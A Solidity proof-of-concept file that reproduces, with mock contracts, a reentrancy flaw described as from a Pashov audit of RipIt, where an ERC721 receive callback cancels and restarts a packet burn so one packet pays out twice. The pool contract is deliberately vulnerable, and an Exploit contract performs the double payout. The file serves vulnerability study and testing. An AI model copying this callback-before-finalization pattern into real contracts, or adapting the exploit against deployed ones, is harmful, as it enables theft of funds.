// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  RipIt authorizedOpenPacket (Pashov, May 2025).
    safeTransferFrom delivers a card before the OPEN_PACKET burn is finalized.
    The receiver cancels the burn and initiates INSTANT_OPEN_PACKET, which
    pays a second card bundle. One packet pays 200 instead of 100.
*/

contract CardValue {
    string public symbol = "CARD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Card {
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;
    uint256 public nextId = 1;

    function mint(address to) external returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        ownerOf[id] = to;
        balanceOf[to] += 1;
    }

    function safeTransferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "owner");
        require(msg.sender == from, "auth");
        ownerOf[id] = to;
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        if (to.code.length > 0) {
            Receiver(to).onERC721Received(msg.sender, from, id, "");
        }
    }
}

interface Receiver {
    function onERC721Received(address operator, address from, uint256 id, bytes calldata data) external returns (bytes4);
}

contract Packet {
    uint8 public constant NONE = 0;
    uint8 public constant OPEN_PACKET = 1;
    uint8 public constant INSTANT = 2;

    address public pool;
    address public inventory;
    uint256 public finalized;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint8) public burnType;

    function setPool(address nextPool) external {
        pool = nextPool;
    }

    function setInventory(address nextInventory) external {
        inventory = nextInventory;
    }

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
        burnType[id] = NONE;
    }

    function initiateBurn(uint256 id, uint8 kind) external {
        require(ownerOf[id] == msg.sender, "owner");
        require(burnType[id] == NONE, "burning");
        burnType[id] = kind;
        if (kind == INSTANT) {
            Pool(pool).instantOpenPacket(id, msg.sender);
        }
    }

    function cancelBurn(uint256 id) external {
        require(ownerOf[id] == msg.sender, "owner");
        burnType[id] = NONE;
    }

    function finalizeOpen(uint256 id) external {
        ownerOf[id] = inventory;
        burnType[id] = NONE;
        finalized += 1;
    }
}

contract Pool {
    uint256 public constant SET_VALUE = 100e18;
    Card public immutable card;
    Packet public immutable packet;
    CardValue public immutable valueToken;

    constructor(Card _card, Packet _packet, CardValue _valueToken) {
        card = _card;
        packet = _packet;
        valueToken = _valueToken;
    }

    function authorizedOpenPacket(uint256 id, address to) external {
        uint256 cardId = card.mint(address(this));
        // @> VULN: the card transfer notifies the receiver before finalizeOpen
        card.safeTransferFrom(address(this), to, cardId);
        valueToken.transfer(to, SET_VALUE);
        packet.finalizeOpen(id);
    }

    function instantOpenPacket(uint256 id, address to) external {
        require(msg.sender == address(packet), "packet");
        uint256 cardId = card.mint(address(this));
        card.safeTransferFrom(address(this), to, cardId);
        valueToken.transfer(to, SET_VALUE);
        packet.finalizeOpen(id);
    }
}

contract Manager {
    function open(Pool pool, Packet packet, uint256 id) external {
        pool.authorizedOpenPacket(id, packet.ownerOf(id));
    }
}

contract Honest {
    Packet public immutable packet;
    Manager public immutable manager;
    Pool public immutable pool;

    constructor(Packet _packet, Manager _manager, Pool _pool) {
        packet = _packet;
        manager = _manager;
        pool = _pool;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return Honest.onERC721Received.selector;
    }

    function open(uint256 id) external {
        packet.initiateBurn(id, packet.OPEN_PACKET());
        manager.open(pool, packet, id);
    }
}

contract Exploit {
    CardValue public token;
    Card public card;
    Packet public packet;
    Pool public pool;
    Manager public manager;
    bool internal entered;

    constructor() {
        token = new CardValue();
        card = new Card();
        packet = new Packet();
        pool = new Pool(card, packet, token);
        manager = new Manager();
        packet.setPool(address(pool));
        packet.setInventory(address(0xBEEF));
        packet.mint(address(this), 1);
        token.mint(address(pool), 200e18);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!entered) {
            entered = true;
            packet.cancelBurn(1);
            packet.initiateBurn(1, packet.INSTANT());
        }
        return Exploit.onERC721Received.selector;
    }

    function run() external {
        require(card.balanceOf(address(this)) == 0, "no cards yet");
        packet.initiateBurn(1, packet.OPEN_PACKET());
        require(packet.burnType(1) == packet.OPEN_PACKET(), "open burn");
        manager.open(pool, packet, 1);
        require(card.balanceOf(address(this)) == 2, "two card sets");
        require(token.balanceOf(address(this)) == 200e18, "paid 200");
        require(packet.finalized() == 2, "finalized twice");
        require(token.balanceOf(address(pool)) == 0, "pool paid both");
        require(200e18 == 2 * pool.SET_VALUE(), "twice the set");
    }
}
